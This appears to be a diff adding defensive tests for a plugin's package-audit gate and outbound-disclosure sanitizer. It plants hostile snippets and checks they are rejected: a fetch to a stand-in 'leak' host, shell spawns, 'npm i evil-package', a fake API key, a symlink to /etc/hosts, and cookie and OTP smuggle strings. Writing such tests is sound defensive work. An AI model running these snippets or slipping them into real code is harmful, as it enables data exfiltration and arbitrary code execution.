@@ -333,3 +333,207 @@ test("Ticket16 setTimeout is not treated as daemon (isolated plant)", async () =
   assert.equal(okTimer.ok, true, JSON.stringify(okTimer.errors));
   assertCanonicalPackageNotPoisoned();
 });
+
+// ---------------------------------------------------------------------------
+// P1 correction R3 — Root-confirmed false-green closures
+// ---------------------------------------------------------------------------
+
+const ROOT_PACKAGE_PLANTS: { name: string; content: string; errorSubstr: string }[] = [
+  {
+    name: "fetch_global",
+    content: 'fetch("https://example.invalid/leak");\n',
+    errorSubstr: "network_global",
+  },
+  {
+    name: "child_process_bare_spawn_sh",
+    content: 'import { spawn } from "child_process"; spawn("sh", ["-c", "echo x"]);\n',
+    errorSubstr: "shell_child_process",
+  },
+  {
+    name: "sk_proj_credential",
+    content: 'export const k = "sk-proj-abcdefghijklmnopqrstuvwxyz123456";\n',
+    errorSubstr: "embedded_credential",
+  },
+  {
+    name: "websocket_global",
+    content: 'new WebSocket("wss://example.invalid");\n',
+    errorSubstr: "network_global",
+  },
+  {
+    name: "npm_install_capability",
+    content: 'const cmd = "npm i evil-package";\n',
+    errorSubstr: "dynamic_install",
+  },
+];
+
+for (const plant of ROOT_PACKAGE_PLANTS) {
+  test(`Ticket16 package audit rejects Root plant: ${plant.name}`, async () => {
+    ensurePackageBuilt();
+    const mod = await loadGate("package-audit.mjs");
+    const checkPackageAudit = mod.checkPackageAudit as (
+      r: string,
+      opts?: { plant?: { rel: string; content: string } },
+    ) => { ok: boolean; reason_code: string | null; errors?: string[] };
+    const r = checkPackageAudit(repoRoot, {
+      plant: {
+        rel: `dist/__t16_root_${plant.name}.js`,
+        content: plant.content,
+      },
+    });
+    assert.equal(r.ok, false, `${plant.name} must fail closed`);
+    assert.equal(r.reason_code, "GATE_PACKAGE_AUDIT");
+    assert.ok(
+      (r.errors ?? []).some((e) => e.includes(plant.errorSubstr)),
+      `expected error containing ${plant.errorSubstr}, got ${JSON.stringify(r.errors)}`,
+    );
+    assertCanonicalPackageNotPoisoned();
+    const secrets = await secretValues();
+    assertNoSecretCorpusInText(JSON.stringify(r), secrets);
+  });
+}
+
+test("Ticket16 package audit rejects symlink in package tree (safe temp copy)", async () => {
+  ensurePackageBuilt();
+  const fsPromises = await import("node:fs");
+  const os = await import("node:os");
+  const pathMod = await import("node:path");
+  const canonical = pathMod.join(repoRoot, "release/codex-changeguard-plugin");
+  const tempRoot = fsPromises.mkdtempSync(pathMod.join(os.tmpdir(), "cg-t16-symlink-"));
+  const isolated = pathMod.join(tempRoot, "codex-changeguard-plugin");
+  // Shallow copy of package for symlink plant
+  fsPromises.cpSync(canonical, isolated, { recursive: true });
+  const linkPath = pathMod.join(isolated, "dist", "__t16_symlink_escape.js");
+  try {
+    fsPromises.symlinkSync("/etc/hosts", linkPath);
+  } catch {
+    // Windows may require elevation; skip if symlink unsupported
+    fsPromises.rmSync(tempRoot, { recursive: true, force: true });
+    assert.ok(true, "symlink unsupported on platform — treated as non-blocking");
+    return;
+  }
+  const mod = await loadGate("package-audit.mjs");
+  const checkPackageAudit = mod.checkPackageAudit as (
+    r: string,
+    opts?: { packageDir?: string },
+  ) => { ok: boolean; reason_code: string | null; errors?: string[] };
+  const r = checkPackageAudit(repoRoot, { packageDir: isolated });
+  fsPromises.rmSync(tempRoot, { recursive: true, force: true });
+  assert.equal(r.ok, false);
+  assert.equal(r.reason_code, "GATE_PACKAGE_AUDIT");
+  assert.ok(
+    (r.errors ?? []).some((e) => e.includes("package_symlink")),
+    JSON.stringify(r.errors),
+  );
+  assertCanonicalPackageNotPoisoned();
+});
+
+test("Ticket16 package audit rejects shell spawn inside allowlisted harness file plant", async () => {
+  ensurePackageBuilt();
+  const mod = await loadGate("package-audit.mjs");
+  const checkPackageAudit = mod.checkPackageAudit as (
+    r: string,
+    opts?: { plant?: { rel: string; content: string } },
+  ) => { ok: boolean; reason_code: string | null; errors?: string[] };
+  // Plant content that looks like harness path but with shell interpreter
+  const r = checkPackageAudit(repoRoot, {
+    plant: {
+      rel: "dist/harness/scenario.js",
+      content:
+        'import { spawn } from "node:child_process";\nspawn("sh", ["-c", "echo pwn"]);\n',
+    },
+  });
+  assert.equal(r.ok, false);
+  assert.equal(r.reason_code, "GATE_PACKAGE_AUDIT");
+  assert.ok(
+    (r.errors ?? []).some((e) => e.includes("arbitrary_shell")),
+    JSON.stringify(r.errors),
+  );
+  assertCanonicalPackageNotPoisoned();
+});
+
+test("Ticket16 package audit rejects bare network import (not only node: prefix)", async () => {
+  ensurePackageBuilt();
+  const mod = await loadGate("package-audit.mjs");
+  const checkPackageAudit = mod.checkPackageAudit as (
+    r: string,
+    opts?: { plant?: { rel: string; content: string } },
+  ) => { ok: boolean; reason_code: string | null; errors?: string[] };
+  const r = checkPackageAudit(repoRoot, {
+    plant: {
+      rel: "dist/__t16_bare_https.js",
+      content: 'import https from "https";\nexport const h = https;\n',
+    },
+  });
+  assert.equal(r.ok, false);
+  assert.equal(r.reason_code, "GATE_PACKAGE_AUDIT");
+  assert.ok((r.errors ?? []).some((e) => e.includes("network_module")));
+  assertCanonicalPackageNotPoisoned();
+});
+
+test("Ticket16 outbound disclosure rejects Root Cookie/OTP/session smuggle", async () => {
+  assert.ok(fs.existsSync(path.join(repoRoot, "dist/evidence/disclosure.js")));
+  const href = pathToFileURL(path.join(repoRoot, "dist/evidence/disclosure.js")).href;
+  const disc = (await import(href)) as {
+    buildDisclosureManifest: (c: Record<string, unknown>) => { fields: unknown[] };
+    buildTransportRequest: (
+      m: { fields: unknown[] },
+      c: Record<string, unknown>,
+    ) => Record<string, unknown>;
+    sanitizeSendableLocalFields: (c: Record<string, unknown>) => Record<string, unknown>;
+    isSendableDisclosureToken: (v: string) => boolean;
+  };
+  const smuggles = [
+    "Cookie: session_id=cg-t16-cookie-value-DEADBEEF",
+    "one-time-code=847291",
+    "session_rollout_content=COMPLETE_ROLLOUT_BODY_cg-t16-session-payload-NOEXPORT",
+  ];
+  const base = {
+    codex_version: "0.50.0",
+    surface: "browser_control",
+    platform_os: "macos",
+    platform_arch: "arm64",
+    config_keys: ["shell_environment_policy.set"],
+    feature_ids: ["browser"],
+  };
+  for (const s of smuggles) {
+    assert.equal(disc.isSendableDisclosureToken(s), false, `token must reject: ${s.slice(0, 24)}`);
+    const ctx = { ...base, error_class: s };
+    const sendable = disc.sanitizeSendableLocalFields(ctx);
+    assert.equal(sendable.error_class, undefined, "error_class must be omitted");
+    const manifest = disc.buildDisclosureManifest(ctx);
+    const req = disc.buildTransportRequest(manifest, ctx);
+    const text = JSON.stringify(req);
+    assert.equal(text.includes(s), false, "smuggle must not appear on request");
+    assert.equal(text.includes("cg-t16-cookie-value-DEADBEEF"), false);
+    assert.equal(text.includes("847291"), false);
+    assert.equal(text.includes("COMPLETE_ROLLOUT_BODY_cg-t16"), false);
+    assert.equal("error_class" in req, false);
+  }
+  // Legitimate identifiers still accepted
+  assert.equal(disc.isSendableDisclosureToken("0.50.0"), true);
+  assert.equal(disc.isSendableDisclosureToken("browser_control"), true);
+  assert.equal(disc.isSendableDisclosureToken("macos"), true);
+  assert.equal(disc.isSendableDisclosureToken("arm64"), true);
+  assert.equal(disc.isSendableDisclosureToken("shell_environment_policy.set"), true);
+  assert.equal(disc.isSendableDisclosureToken("plugin:cache-manager"), true);
+  assert.equal(disc.isSendableDisclosureToken("Error"), true);
+  const secrets = await secretValues();
+  // Full corpus cannot enter any scalar/list sendable field
+  for (const v of secrets) {
+    assert.equal(disc.isSendableDisclosureToken(v), false);
+    for (const field of ["codex_version", "surface", "platform_os", "platform_arch", "error_class"]) {
+      const ctx = { ...base, [field]: v };
+      const sendable = disc.sanitizeSendableLocalFields(ctx);
+      assert.equal(
+        JSON.stringify(sendable).includes(v),
+        false,
+        `secret must not appear in sendable after ${field}`,
+      );
+    }
+    for (const field of ["config_keys", "feature_ids"]) {
+      const ctx = { ...base, [field]: [v] };
+      const sendable = disc.sanitizeSendableLocalFields(ctx);
+      assert.equal(JSON.stringify(sendable).includes(v), false);
+    }
+  }
+});
